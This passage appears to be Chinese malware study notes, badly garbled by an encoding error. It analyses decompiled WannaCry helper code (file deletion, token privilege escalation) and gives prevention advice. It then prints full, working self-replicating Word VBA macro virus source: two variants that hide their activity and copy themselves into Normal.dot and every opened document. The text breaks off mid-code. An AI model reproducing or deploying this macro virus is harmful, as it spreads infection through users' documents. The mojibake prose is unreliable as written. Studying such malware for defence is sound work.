å¯†è¯¥ç”¨æˆ·çš„æ‰€æœ‰æ–‡ä»¶ 7 taskdle.exe ç—…æ¯’è¾…åŠ©æ–‡ä»¶åˆ†æ1234567891011121314151617181920212223242526272829dwDrives = GetLogicalDrives(); // è·å–ç³»ç»Ÿä¸­æ‰€æœ‰çš„ç£ç›˜ v5 = 0x19; do &#123; *(_DWORD *)RootPathName = dword_403060; v8 = dword_403064; RootPathName[0] = v5 + 65; if ( (dwDrives &gt;&gt; v5) &amp; 1 &amp;&amp; GetDriveTypeW(RootPathName) != 4 )//è·å–Dç›˜ç±»å‹ &#123; DeleteFile(v5); // æ¸…ç©ºå›æ”¶ç«™å’Œä¸´æ—¶ç›®å½•æ‰€æœ‰ä»¥.WNCRYT ç»“å°¾æ–‡ä»¶ Sleep(10u); &#125; --v5; &#125; while ( v5 &gt;= 2 ); taskdl çš„ä»£ç é‡ç›¸æ¯”ä¸Šé¢çš„å…¶ä»–æ–‡ä»¶å°å¾ˆå¤šäº†ï¼Œä¸»è¦å°±æ˜¯æ¶‰åŠåˆ é™¤æ–‡ä»¶çš„æ“ä½œ 7.1 DeleteFile åˆ é™¤å›æ”¶ç«™å’Œä¸´æ—¶ç›®å½•ä¸‹çš„.WNCRYæ–‡ä»¶123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193int __cdecl DeleteFile(int a1) &#123; GetRecyclePathOrTempPath(a1, &amp;RecyclePath); &#x2F;&#x2F; è·å–å›æ”¶ç«™è·¯å¾„æˆ–è€…Cç›˜ä¸‹çš„ä¸´æ—¶æ–‡ä»¶å¤¹è·¯å¾„ swprintf(&amp;String, (size_t)aSS, &amp;RecyclePath, aWncryt);&#x2F;&#x2F; string&#x3D;å›æ”¶ç«™è·¯å¾„æˆ–ä¸´æ—¶æ–‡ä»¶å¤¹è·¯å¾„+*.WNCRYT &#x2F;&#x2F; hFile &#x3D; FindFirstFileW(&amp;String, &amp;FindFileData);&#x2F;&#x2F;åœ¨å›æ”¶ç«™æŸ¥æ‰¾æ‰€æœ‰.WNCRYTç»“å°¾çš„æ–‡ä»¶ if ( hFile &#x3D;&#x3D; (HANDLE)-1 ) &#x2F;&#x2F; å¦‚æœæ²¡æ‰¾åˆ°ç›´æ¥è¿”å› &#123; v2 &#x3D; (char *)Memory; v24 &#x3D; -1; if ( Memory !&#x3D; v17 ) &#123; do &#123; std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::~basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;( v2, 0); v2 +&#x3D; 16; &#125; while ( v2 !&#x3D; v17 ); v2 &#x3D; (char *)Memory; &#125; FreeMem(v2); &#x2F;&#x2F; é‡Šæ”¾å†…å­˜ result &#x3D; 0; &#125; else &#123; do &#x2F;&#x2F; å¦‚æœæ‰¾åˆ°äº† &#123; swprintf(&amp;String, (size_t)aSS_0, &amp;RecyclePath, FindFileData.cFileName);&#x2F;&#x2F; æ‹¼æ¥ç›®æ ‡æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ v19 &#x3D; v13; &#x2F;&#x2F; æ¸…ç©ºstringså¯¹è±¡çš„å†…å­˜ std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(&amp;v19, 0); TargetFullPathLen &#x3D; wcslen(&amp;String); &#x2F;&#x2F; è·å–ç›®æ ‡æ–‡ä»¶å®Œæ•´è·¯å¾„çš„é•¿åº¦ if ( (unsigned __int8)std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Grow( &amp;v19, TargetFullPathLen, 1) ) &#123; wmemcpy(TargetFullPath, &amp;String, TargetFullPathLen);&#x2F;&#x2F; æ‹·è´ç›®æ ‡è·¯å¾„ std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Eos( &amp;v19, &#x2F;&#x2F; å°†ç›®æ ‡æ–‡ä»¶è·¯å¾„å’Œé•¿åº¦å†™å…¥åˆ°å®¹å™¨ TargetFullPathLen); &#125; LOBYTE(v24) &#x3D; 1; sub_4013D0(&amp;v15, (int)v17, 1u, (int)&amp;v19);&#x2F;&#x2F; è¿™ä¸ªå‡½æ•°ä¼šæŠŠä¹‹å‰çš„Stringå¯¹è±¡æ”¾åˆ°å¦ä¸€ä¸ªå®¹å™¨é‡Œ LOBYTE(v24) &#x3D; 0; std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(&amp;v19, 1); &#125; while ( FindNextFileW(hFile, &amp;FindFileData) ); FindClose(hFile); &#x2F;&#x2F; æ–‡ä»¶éå†ç»“æŸ v5 &#x3D; 0; for ( i &#x3D; 0; ; i +&#x3D; 16 ) &#123; v7 &#x3D; (char *)Memory; if ( !Memory || v5 &gt;&#x3D; (v17 - (_BYTE *)Memory) &gt;&gt; 4 ) break; TargetFullPath_1 &#x3D; *(const WCHAR )((char *)Memory + i + 4); if ( !TargetFullPath_1 ) TargetFullPath_1 &#x3D; (const WCHAR *)&#96;std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Nullstr&#39;::&#96;2&#39;::_C; if ( DeleteFileW(TargetFullPath_1) ) &#x2F;&#x2F; åˆ é™¤ç›®æ ‡æ–‡ä»¶ ++v14; ++v5; &#125; v9 &#x3D; (char *)Memory; v10 &#x3D; v17; v11 &#x3D; (char *)Memory; if ( Memory !&#x3D; v17 ) &#123; do &#123; std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(v11, 1); v11 +&#x3D; 16; &#125; while ( v11 !&#x3D; v10 ); v7 &#x3D; (char *)Memory; &#125; v17 &#x3D; v9; v24 &#x3D; -1; v12 &#x3D; v7; if ( v7 !&#x3D; v9 ) &#123; do &#123; &#x2F;&#x2F; å¾ªç¯æ¸…ç©ºæ¯ä¸€ä¸ªå®¹å™¨é‡Œçš„å†…å®¹ std::basic_string&lt;unsigned short,std::char_traits&lt;unsigned short&gt;,std::allocator&lt;unsigned short&gt;&gt;::_Tidy(v12, 1); v12 +&#x3D; 16; &#125; while ( v12 !&#x3D; v9 ); v7 &#x3D; (char *)Memory; &#125; FreeMem(v7); &#x2F;&#x2F; é‡Šæ”¾å†…å­˜ result &#x3D; v14; &#125; return result; &#125; é¦–å…ˆï¼Œè¯¥å‡½æ•°åˆ©ç”¨äº† GetRecyclePathOrTempPah å‡½æ•°è·å¾—äº† å›æ”¶ç«™D:/$RECYCLE å’Œç³»ç»Ÿç›˜å†å²æ–‡ä»¶å¤¹çš„è·¯å¾„C:UsersDingisoAppDataLocalTemp è¿™ä¸¤ä¸ªåœ°å€ ç„¶åå‡½æ•°ä¼šå¾ªç¯ä¸¤æ¬¡ï¼Œåˆ¤æ–­æ˜¯å¦ç³»ç»Ÿä¸­å­˜åœ¨å…¶ä»–çš„ç›˜ç¬¦ã€‚ æ¥ç€å‡½æ•°åˆ©ç”¨FindFirstWå‡½æ•°æŸ¥æ‰¾ç›®æ ‡æ–‡ä»¶å¤¹ä¸­æ‰€æœ‰çš„ä»¥.WNCRYTç»“å°¾çš„æ–‡ä»¶ å‡½æ•°ä¼šå°†ä»–éå†çš„æ‰€æœ‰çš„.WNCRYTæ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œé•¿åº¦å­˜å‚¨åˆ°ä¸€ä¸ªå®¹å™¨ä¸­ å½“æ–‡ä»¶éå†ç»“æŸ ä¼šè°ƒç”¨DeleteFileW åˆ é™¤æ‰€æœ‰å®¹å™¨ä¸­è®°å½•çš„é¡¹ æœ€å å¾ªç¯å°†å­˜æ”¾æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œé•¿åº¦çš„å®¹å™¨æ¸…ç©º ï¼Œé‡Šæ”¾èµ„æº 8 taskse.exe ç—…æ¯’è¾…åŠ©æ–‡ä»¶åˆ†æ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081signed int __cdecl sub_401000(int argv, int a2, __int16 Num_5, int Num_0) &#123; Advapi32Base = GetModuleHandleA(LibFileName); // è·å–advapi32.dllå¥æŸ„ if ( !Advapi32Base ) &#123; Advapi32Base = LoadLibraryA(LibFileName); // åŠ è½½advapi32.dll *kernel32Base = GetModuleHandleA(kernel32); if ( !kernel32Base ) &#123; kernel32Base = LoadLibraryA(kernel32); // åŠ è½½kernel32.dll if ( !kernel32Base ) return -1; &#125; hProcess = ((int (__stdcall *)(signed int, void ))GetCurrentProcess_Addr)(40, &amp;TokenHandle);// è·å–å½“å‰è¿›ç¨‹çš„ä¼ªå¥æŸ„ if ( !((int (__stdcall *)(int))OpenProcessToken_Addr)(hProcess) )// ä»¥ä¿®æ”¹æƒé™çš„æ–¹å¼ æ‰“å¼€è¿›ç¨‹çš„ä»¤ç‰Œ goto LABEL_55; if ( !((int (__stdcall *)(_DWORD, char *, int *))LookupPrivilegeValueA_Addr)(0, aSetcbprivilege, &amp;lpLuid) )// è·å¾—LUID &#123; local_unwind2((int)&amp;ms_exc.registration, -1); return -1; &#125; NewState = 1; lpLuid_1 = lpLuid; v18 = v27; v19 = 2; if ( !((int (__stdcall *)(void *, _DWORD, int *, signed int, int *, char *))AdjustTokenPrivileges_Addr)( TokenHandle, 0, &amp;NewState, 0x10, &amp;PreviousState, &amp;ReturnLength) ) // æå‡å½“å‰æƒé™ &#123; * if ( !((int (__stdcall *)(int, void ))WTSQueryUserToken_Addr)(SessionId, &amp;phToken) )// è·å–ç”¨æˆ·çš„è®¿é—®ä»¤ç‰Œ &#123; local_unwind2((int)&amp;ms_exc.registration, -1); return -1; &#125; if ( !((int (__stdcall *)(void *, signed int, _DWORD, signed int, signed int, void ))DuplicateTokenEx_Addr)(// åˆ›å»ºä¸€ä¸ªæ–°çš„è®¿é—®ä»¤ç‰Œ è¯¥æ–‡ä»¶çš„ä¸»è¦ä½œç”¨æ˜¯ææƒï¼Œä¸»è¦é€»è¾‘å¦‚ä¸‹ï¼š è·å–å¿…è¦APIå‡½æ•°åœ°å€ æä¸Šå½“å‰çš„æƒé™ è·å–å½“å‰ç”¨æˆ·çš„è®¿é—®ä»¤ç‰Œå¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„è®¿é—®ä»¤ç‰Œ æœ€åå†æ¬¡æå‡æƒé™ 9 WannaCry ç—…æ¯’åˆ†ææ€»ç»“è¯¥ç—…æ¯’æ¶‰åŠçš„ç›¸å…³æ–‡ä»¶åŠä½œç”¨å¦‚ä¸‹ï¼š msg ç—…æ¯’çš„è¯­è¨€åŒ… c.wnry å­˜å‚¨äº†æ¯”ç‰¹å¸è´¦æˆ· ä¸€ä¸ªä¸‹è½½é“¾æ¥ è·Ÿå‹’ç´¢ç›¸å…³ t.wnry éšè—äº†ä¸€ä¸ªdllæ–‡ä»¶ dllçš„å¯¼å‡ºå‡½æ•°æ˜¯ç—…æ¯’çš„æ ¸å¿ƒä»£ç  u.wnry è§£å¯†å™¨ r.wrny å‹’ç´¢æ–‡æ¡£ @WanaDecryptor@.exe è§£å¯†å™¨ taskse.exe ææƒ taskdl.exe åˆ é™¤ä¸´æ—¶æ–‡ä»¶å’Œå›æ”¶ç«™çš„.WNCRYæ–‡ä»¶ 00000000.pky å…¬é’¥ 00000000.eky è¢«åŠ å¯†çš„ç§é’¥ 00000000.res å…«ä¸ªå­—èŠ‚çš„éšæœºæ•°å’Œå½“å‰æ—¶é—´ .batä¸ºè§£å¯†å™¨åˆ›å»ºå¿«æ·æ–¹å¼ é™„ä¸Šç—…æ¯’è¡Œä¸ºçš„æ€»ç»“å›¾è¡¨ï¼š 10 ç—…æ¯’é¢„é˜²åŠæ€æ¯’æ–¹æ¡ˆï¼š è¯¥ç—…æ¯’åˆ©ç”¨äº†æ°¸æ’ä¹‹è“çš„æ¼æ´ï¼Œå¾®è½¯å®˜æ–¹æä¾›äº†ç›¸åº”çš„è¡¥ä¸æ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å°½å¿«å®‰å…¨æ›´æ–°çš„æ–¹å¼é˜²æ­¢å—åˆ°é’ˆå¯¹æ­¤æ¼æ´çš„ç—…æ¯’çš„æ”»å‡» ç»è¿‡æˆ‘ä»¬åˆ†æå¾—çŸ¥ï¼Œè¯¥ç—…æ¯’çš„ä¼ æ’­ä¸»è¦æ˜¯åˆ©ç”¨äº† 445 ç«¯å£å‘é€ç—…æ¯’æœ¬ä½“ï¼Œå…³é—­ç«¯å£å¯ä»¥é˜²æ­¢æˆ‘ä»¬è¢«æ”»å‡»ã€‚ åœ¨åˆ†æç—…æ¯’ exe æ–‡ä»¶æ—¶ï¼Œç—…æ¯’åŠ å¯†å™¨åœ¨ åŠ å¯†å‰ä¼šè¿›è¡Œäº’æ–¥ä½“æ£€æµ‹ã€‚æ£€æµ‹æ˜¯å¦å·²ç»æœ‰åŠ å¯†å™¨ç¨‹åºå­˜åœ¨ï¼Œè¿™æ˜¯åˆ›å»ºäº†äº’æ–¥ä½“ MsWinZonesCacheCounterMutexA ï¼Œå®‰å…¨è½¯ä»¶å¯ä»¥é¢„å…ˆåˆ›å»ºäº’æ–¥ä½“ï¼Œè¿™æ ·åŠ å¯†å™¨åœ¨åŠ å¯†å‰å°±ä¼šè‡ªåŠ¨æ¨å‡ºï¼Œä¸ä¼šè¿›è¡ŒåŠ å¯† 11 å­¦ä¹ ç¬”è®°ï¼šå¾®è½¯ å®ç—…æ¯’ç—…æ¯’ä¸»ä½“ basic123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&#39; Micro-VirusSub Document_Open()On Error Resume NextApplication. DisplayStatusBar&#x3D;False &#39;å±è”½çŠ¶æ€æ Options. SaveNormalPrompt&#x3D;False&#39;ä¿®æ”¹å…¬ç”¨æ¨¡æ¿æ—¶åœ¨åå°è‡ªåŠ¨ä¿å­˜ï¼Œä¸ç»™ä»»ä½•æç¤ºOurcode &#x3D;ThisDocument. VBProject. VBComponents(1). CodeModule.Lines(1,100)&#39;è·å–å½“å‰æ–‡æ¡£ä»£ç å¯¹è±¡Set Host &#x3D;NormalTemplate. VBProject. VBComponents(1). CodeModule&#39;è·å–å…±ç”¨æ¨¡æ¿çš„ä»£ç å¯¹è±¡If ThisDocument &#x3D;NormalTemplate Then&#39;åˆ¤æ–­å½“å‰æ–‡ä»¶æ˜¯å¦ç­‰äºå…¬ç”¨æ¨¡æ¿å¯¹è±¡Set Host&#x3D;ActiveDocument. VBPro ject. VBComponents(1). CodeModule&#39;å¦‚æœæ˜¯ï¼Œåˆ™è·å–å½“å‰æ´»åŠ¨æ–‡æ¡£çš„ä»£ç å¯¹è±¡End IfWith HostIf. Lines(1.1)&lt;&gt;&quot;Micro-Virus&quot;Then &#39;åˆ¤æ–­å½“å‰æ–‡æ¡£æ˜¯å¦æ„ŸæŸ“ç—…æ¯’. Deletelines 1,. CountOfLines &#39;å¦‚æœä¸æ˜¯ï¼Œå°±æ¸…é™¤åŸæ¥çš„ä»£ç . Insertlines 1, Ourcode&#39;åµŒå…¥ç—…æ¯’ä»£ç . Replaceline 2,&quot;Sub Document_Close()&quot;&#39;æ›´æ¢If ThisDocument&#x3D;nomaltemplate Then &#39;åˆ¤æ–­å½“å‰çš„æ–‡æ¡£æ˜¯å¦æ˜¯å…¬ç”¨æ¨¡å—. ReplaceLine 2,&quot;Sub Document_Open()&quot;ActiveDocument. SaveAs ActiveDocument. FullNameEnd IfEnd IfEnd WithMsgBox &quot;MicroVirus by Content Security Lab&quot;End Sub ç—…æ¯’åˆ†æ2.4è¯¥ä»£ç çš„åŸºæœ¬æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š1ï¼‰è¿›è¡Œå¿…è¦çš„è‡ªæˆ‘ä¿æŠ¤ã€‚é«˜æ˜çš„ç—…æ¯’ç¼–å†™è€…å…¶è‡ªæˆ‘ä¿æŠ¤å°†åšå¾—éå¸¸å¥½ï¼Œå¯ä»¥ä½¿wordçš„ä¸€äº›å·¥å…·æ å¤±æ•ˆï¼Œä¾‹å¦‚å°†å·¥å…·èœå•ä¸­çš„å®é€‰é¡¹å±è”½ï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹æ³¨å†Œè¡¨è¾¾åˆ°å¾ˆå¥½çš„éšè—æ•ˆæœã€‚æœ¬ä¾‹ä¸­åªæ˜¯å±è”½çŠ¶æ€æ ï¼Œä»¥å…æ˜¾ç¤ºå®çš„è¿è¡ŒçŠ¶æ€ï¼Œå¹¶ä¸”ä¿®æ”¹å…¬ç”¨æ¨¡æ¿æ—¶è‡ªåŠ¨ä¿å­˜ï¼Œä¸ç»™ç”¨æˆ·æç¤ºã€‚ basic1Application.DisplayStatusBar&#x3D;False Options.SaveNormalPrompt&#x3D;False 2ï¼‰å¾—åˆ°å½“å‰æ–‡æ¡£çš„ä»£ç å¯¹è±¡å’Œå…¬ç”¨æ¨¡æ¿çš„ä»£ç å¯¹è±¡ã€‚ 2ï¼‰å¾—åˆ°å½“å‰æ–‡æ¡£çš„ä»£ç å¯¹è±¡å’Œå…¬ç”¨æ¨¡æ¿çš„ä»£ç å¯¹è±¡ã€‚ basic123456789Ourcode&#x3D;ThisDocument.VBProject.VBComponentsï¼ˆ1ï¼‰.CodeModule.Linesï¼ˆ1ï¼Œ100ï¼‰Set Host&#x3D;NormalTemplate.VBPro ject.VBComponentsï¼ˆ1ï¼‰.CodeModuleIf ThisDocument &#x3D;NormalTemplate ThenSet Host&#x3D;ActiveDocument.VBProject.VBComponentsï¼ˆ1ï¼‰.CodeModuleEnd If 3ï¼‰æ£€æŸ¥æ¨¡æ¿æ˜¯å¦å·²ç»æ„ŸæŸ“ç—…æ¯’ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™å¤åˆ¶å®ç—…æ¯’ä»£ç åˆ°æ¨¡æ¿ï¼Œå¹¶ä¸”ä¿®æ”¹å‡½æ•°åã€‚ basic123456789101112131415161718192021With HostIf.Linesï¼ˆ1.1ï¼‰&lt;ï¼‰&quot;&quot;Micro-Virus&quot;Then.Deletelines 1ï¼Œ.CountOfLines.InsertLines 1ï¼ŒOurcode.ReplaceLine 2ï¼Œ&quot;Sub Document_Closeï¼ˆï¼‰&quot;If ThisDocument&#x3D;nomaltemplate Then.ReplaceLine 2ï¼Œ&quot;Sub Document_openï¼ˆï¼‰&quot;ActiveDocument.SaveAs ActiveDocument.Ful1NameEnd IfEnd IfEnd With 4ï¼‰æ‰§è¡Œæ¶æ„ä»£ç ã€‚ basic1MsgBox&quot;MicroVirus by Content Security Lab&quot; 2.5æ­¤æ—¶å½“å‰wordæ–‡æ¡£å°±å«æœ‰å®ç—…æ¯’ï¼Œåªè¦ä¸‹æ¬¡æ‰“å¼€è¿™ä¸ªwordæ–‡æ¡£ï¼Œå°±ä¼šæ‰§è¡Œä»¥ä¸Šä»£ç ï¼Œå¹¶å°†è‡ªèº«å¤åˆ¶åˆ°Normal.dotï¼ˆwordæ–‡æ¡£çš„å…¬å…±æ¨¡æ¿ï¼‰å’Œå½“å‰æ–‡æ¡£çš„ThisDocumentä¸­ï¼ŒåŒæ—¶æ”¹å˜å‡½æ•°åï¼ˆæ¨¡æ¿ä¸­ä¸ºDocumentCloseï¼Œå½“å‰æ–‡æ¡£ä¸ºDocumentOpenï¼‰ï¼Œæ­¤æ—¶æ‰€æœ‰çš„wordæ–‡æ¡£æ‰“å¼€å’Œå…³é—­æ—¶ï¼Œéƒ½å°†è¿è¡Œä»¥ä¸Šçš„ç—…æ¯’ä»£ç ï¼Œå¯ä»¥åŠ å…¥é€‚å½“çš„æ¶æ„ä»£ç ï¼Œå½±å“wordçš„æ­£å¸¸ä½¿ç”¨ï¼Œæœ¬ä¾‹ä¸­åªæ˜¯ç®€å•çš„è·³å‡ºä¸€ä¸ªæç¤ºæ¡†ã€‚å°†å½“å‰æ–‡æ¡£å…³é—­å†é‡æ–°æ‰“å¼€ï¼Œå¼¹å‡ºä¸€ä¸ªæç¤ºæ¡†ï¼Œä¸”å±è”½äº†çŠ¶æ€æ  å®ç—…æ¯’åˆ†æ2æ‰¾åˆ°ä¸€ä¸ªç±»ä¼¼äºç»™å‡ºç—…æ¯’çš„å®ç°å¹¶è¿›è¡Œåˆ†æ basic123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271&#39;moonlightDim nm(4)Sub Smallboy_Virus()&#39;å±è”½çŠ¶æ€æ ï¼Œä»¥å…æ˜¾ç¤ºå®ç—…æ¯’æ‰§è¡ŒçŠ¶æ€ï¼›ä¿®æ”¹å…¬ç”¨æ¨¡ç‰ˆæ˜¯è‡ªåŠ¨ä¿å­˜ä¸”ä¸æç¤ºï¼›è‡ªåŠ¨æ‰§è¡Œç—…æ¯’æ¨¡æ¿On Error Resume NextApplication.DisplayStatusBar &#x3D; False&#39;å±è”½çŠ¶æ€æ Options.SaveNormalPrompt &#x3D; False&#39;ä¿®æ”¹å…¬ç”¨æ¨¡æ¿æ—¶åœ¨åå°è‡ªåŠ¨ä¿å­˜ï¼Œä¸ç»™ä»»ä½•æç¤ºOurcode &#x3D; ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1,100)&#39;è·å–å½“å‰æ–‡æ¡£ä»£ç å¯¹è±¡Set host &#x3D; NormalTemplate.VBProject.VBComponents(1).CodeModule&#39;è·å–å…±ç”¨æ¨¡æ¿çš„ä»£ç å¯¹è±¡&#39;&#39;è·å–å½“å‰æ–‡æ¡£å¯¹è±¡ä»£ç å’Œå…±ç”¨æ¨¡æ¿å¯¹è±¡ä»£ç If ThisDocument &#x3D; NormalTemplate Then&#39;åˆ¤æ–­å½“å‰æ–‡ä»¶æ˜¯å¦ç­‰äºå…¬ç”¨æ¨¡æ¿å¯¹è±¡Set host &#x3D; ActiveDocument.VBProject.VBComponents(1).CodeModule&#39;å¦‚æœæ˜¯ï¼Œåˆ™è·å–å½“å‰æ´»åŠ¨æ–‡æ¡£çš„ä»£ç å¯¹è±¡End If&#39;&#39;è®¾ç«‹æ£€æŸ¥å½“å‰æ–‡æ¡£æ˜¯å¦è¢«æ„ŸæŸ“ï¼Œå¦‚æœæ²¡æœ‰å°±è‡ªåŠ¨æ‰§è¡Œå¤åˆ¶å®ç—…æ¯’åˆ°æ¨¡æ¿å¹¶ä¿®æ”¹å‡½æ•°åæ“ä½œWith hostIf .Lines(1.1) &lt;&gt; &quot;Smallboy_Virus()&quot; Then&#39;åˆ¤æ–­å½“å‰æ–‡æ¡£æ˜¯å¦æ„ŸæŸ“ç—…æ¯’.deletelines 1, .countoflines&#39;å¦‚æœä¸æ˜¯ï¼Œå°±æ¸…é™¤åŸæ¥çš„ä»£ç .insertlines 1, .OurcodeLines&#39;åµŒå…¥ç—…æ¯’ä»£ç .replaceline 2, &quot;Sub Smallboy_Virus()&quot;&#39;æ›´æ¢ Smallboy_VirusIf ThisDocument &#x3D; NormalTemplate Then&#39;åˆ¤æ–­å½“å‰çš„æ–‡æ¡£æ˜¯å¦ç­‰äºå…¬ç”¨æ¨¡å—.replaceline 2, &quot;Sub Smallboy_Virus()&quot;&#39;å¦‚æœæ˜¯ï¼Œåˆ™æ›¿æ¢ä¸º Smallboy_VirusActiveDocument.SaveAs ActiveDpcument.FullName&#39;ä¿å­˜æ–‡æ¡£ï¼Œå¹¶ä¿®æ”¹å‡½æ•°åï¼ˆï¼‰End IfEnd IfEnd With&#39;*å¼¹å‡ºç¬¬ä¸€ä¸ªæ¡†*MsgBox &quot;ï¼ï¼ï¼&quot;&#39;*å®šä¹‰ç®—æ•°æ•°æ®æˆå‘˜*Count &#x3D; 0 &#39;å®šä¹‰count&#x3D;0try: &#39;æ‰§è¡Œtryè¯­å¥On Error GoTo 0On Error GoTo trytest &#x3D; -1 &#39;åˆå§‹åŒ–å¹¶å®šä¹‰text&#x3D;-1con &#x3D; 1 &#39;åˆå§‹åŒ–å¹¶å®šä¹‰con&#x3D;1tog$ &#x3D; &quot;&quot; &#39;åˆå§‹åŒ–tog$i &#x3D; 0 &#39;åˆå§‹åŒ–å¹¶å®šä¹‰i&#x3D;0&#39;å¼€å§‹æ‰§è¡Œç®—æœ¯æ•°æ®æˆå‘˜çš„è¡Œå¾ªç¯è¯­å¥While test &#x3D; -1&#39;å› ä¸ºä¹‹å‰å·²ç»å®šä¹‰äº†test&#x3D;-1ï¼Œæ‰€ä»¥è‚¯å®šä¼šå…ˆæ‰§è¡Œä¸€æ¬¡whileå¾ªç¯For i &#x3D; 0 To 4&#39;æ‰§è¡Œä¸€ä¸ªforå¾ªç¯nm(i) &#x3D; Int(Rnd() * 100)&#39;å°†rndï¼ˆï¼‰*100çš„æ­£æ•´æ•°ç»“æœèµ‹å€¼ç»™æ•°ç»„nmï¼ˆiï¼‰con &#x3D; con * nm(i)&#39;å°†con*nm(i)çš„å€¼ä¼ å›ç»™conIf i &#x3D; 4 Then&#39;å¦‚æœi&#x3D;4,ä¹Ÿå°±æ˜¯forå¾ªç¯ç»“æŸä¹‹åï¼Œå¼€å§‹æ‰§è¡Œifä¸‹çš„è¯­å¥tog$ &#x3D; tog$ + Str$(nm(4)) + &quot;&#x3D;?&quot;&#39;å°†tog$å’ŒStr$( nm(4))+å­—ç¬¦ä¸²&quot;&#x3D;ï¼Ÿ&quot;çš„å€¼éƒ½ä¼ ç»™tog$GoTo beg &#39;æ‰§è¡Œbegè¯­å¥End If &#39;ä¸Šä¸€ä¸ªifåˆ¤æ–­è¯­å¥æ‰§è¡Œç»“æŸtog$ &#x3D; tog$ + Str$(nm(i)) + &quot;*&quot;&#39;å°†tog$å’ŒStr$( nm(4))+å­—ç¬¦ä¸²&quot;*&quot;çš„å€¼éƒ½ä¼ ç»™tog$Next i &#39;è¿”å›forå¾ªç¯beg:&#39;æ˜¾ç¤ºç¬¬äºŒä¸ªå¯¹è¯æ¡†ï¼Œè¿›è¡Œç­”é¢˜åˆ¤æ–­Beepans$ &#x3D; InputBox(&quot;ä»Šå¤©æ˜¯&quot; + Date$ + &quot;ï¼Œæˆ‘ä»¬ç©ä¸ªå¿ƒç®—æ¸¸æˆå¯å¥½ï¼Ÿ&quot; +Chr$(13) + &quot;å¦‚æœä½ ç­”é”™äº†ï¼Œæˆ‘å°†ä»£è¡¨æœˆäº®æ¶ˆç­ä½ ï¼&quot; + Chr$(13) + tog$, &quot;Smallboy&quot;)&#39;æ˜¾ç¤ºå¿ƒç®—é¢˜ï¼Œå’Œè¾“å…¥å¿ƒç®—ç»“æœ&#39;*è¾“å…¥è¿ç®—ç»“æœåå°†è¦æ‰§è¡Œçš„è¯­å¥&#39;If RTrim$(LTrim$(ans$)) &#x3D; LTrim$(Str$(con)) Then&#39;åˆ¤æ–­ans$ä¸conæ˜¯å¦ç›¸ç­‰ï¼Œè¿™æ˜¯æ˜¯ä¸»è¦çš„ifåˆ¤æ–­è¯­å¥ï¼Œæ˜¯ä¸‹é¢è¿›è¡Œæ“ä½œçš„ä¸»è¦ä¾æ®&#39;è¾“å…¥ç­”æ¡ˆæ­£ç¡®åå°†è¦æ‰§è¡Œçš„è¯­å¥&#39;*MsgBox &quot;æ­å–œä½ ç­”å¯¹äº†ï¼ï¼ï¼&quot;&#39;è®¾ç½®æ–‡æœ¬æ ¼å¼ï¼Œå­—ä½“&#39;Documents.AddSelection.Paragraphs.Alignment &#x3D; wdAlignParagraphCenter&#39; è®¾ç½®å±…ä¸­å¯¹é½BeepWith Selection.Font&#39;è®¾ç½®æ–‡æœ¬å­—ä½“.Name &#x3D; &quot;é»‘ä½“&quot;&#39;è®¾ç½®æ–‡æœ¬å­—ä½“ä¸ºé»‘ä½“.Size &#x3D; 16&#39;è®¾ç½®æ–‡æœ¬å­—ä½“å¤§å°ä¸º16.Bold &#x3D; 1&#39;è®¾ç½®æ–‡æœ¬å­—ä½“ä¸ºç²—ä½“.Underline &#x3D; 1&#39;è®¾ç½®æ–‡æœ¬å­—ä½“ä¸ºä¸‹åˆ’çº¿.Color &#x3D; wdColorRose&#39;è®¾ç½®æ–‡æœ¬å­—ä½“é—®ç«ç‘°çº¢è‰²End WithSelection.InsertAfter Text &#x3D; &quot;ä»€ä¹ˆæ˜¯å®ç—…æ¯’ï¼Ÿ&quot; &#39;åµŒå…¥æ–‡æœ¬Selection.InsertParagraphAfter &#39;æ¢è¡ŒBeepSelection.InsertAfter Text:&#x3D;&quot;ç­”æ¡ˆï¼š&quot; &#39;åµŒå…¥æ–‡æœ¬Selection.Font.Italic &#x3D; 1 &#39;è®¾ç½®æ–‡æœ¬å­—ä½“ä¸ºæ–œä½“Selection.InsertAfter Text:&#x3D;&quot;æˆ‘å°±æ˜¯&quot; &#39;åµŒå…¥æ–‡æœ¬Selection.InsertParagraphAfter &#39;æ¢è¡ŒSelection.InsertParagraphAfter &#39;æ¢è¡ŒSelection.Font.Italic 